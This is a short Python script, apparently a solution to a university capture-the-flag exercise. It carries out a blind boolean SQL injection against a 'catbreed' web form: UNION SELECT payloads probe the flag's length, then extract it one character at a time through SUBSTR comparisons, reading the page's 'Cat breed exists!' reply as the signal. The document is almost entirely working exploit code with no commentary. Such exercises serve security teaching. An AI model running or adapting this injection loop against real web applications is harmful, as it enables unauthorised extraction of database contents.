import requests
import sys
from bs4 import BeautifulSoup
alphanumeric_min = 38
alphanumeric_max = 126
# ascii list
asciis = ['!', '"', '#', '$', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~', '_']


# set up URL
url = "http://cs2107-ctfd-i.comp.nus.edu.sg:8081/catbreed"

# set up injection payload
breed = "' UNION SELECT id, flag FROM flags WHERE LENGTH(flag) = {x} --"
form = {"breed": breed, "submit": "Submit"}

def execute_query(url, form):
    response = requests.post(url, data=form)
    soup = BeautifulSoup(response.text, "html.parser")
    quote = soup.find("blockquote").text.strip()
    if quote == "Cat breed exists!":
        return True
    else:
        return False

def find_flag_length(max_length):
    for i in range(1, max_length):
        form["breed"] = breed.format(x=i)
        if execute_query(url, form):
            return i
    return None

def find_flag(flag_length):
    flag = ""
    for i in range(1, flag_length+1):
        for j in asciis:
            breed = "' UNION SELECT id, flag FROM flags WHERE SUBSTR(flag, {i}, 1) = '{j}' --".format(i=i, j=j)
            form["breed"] = breed
            if execute_query(url, form):
                flag += j
                break
        print(flag)
    return flag

flag_length = find_flag_length(100)
flag = find_flag(flag_length)
print(flag)

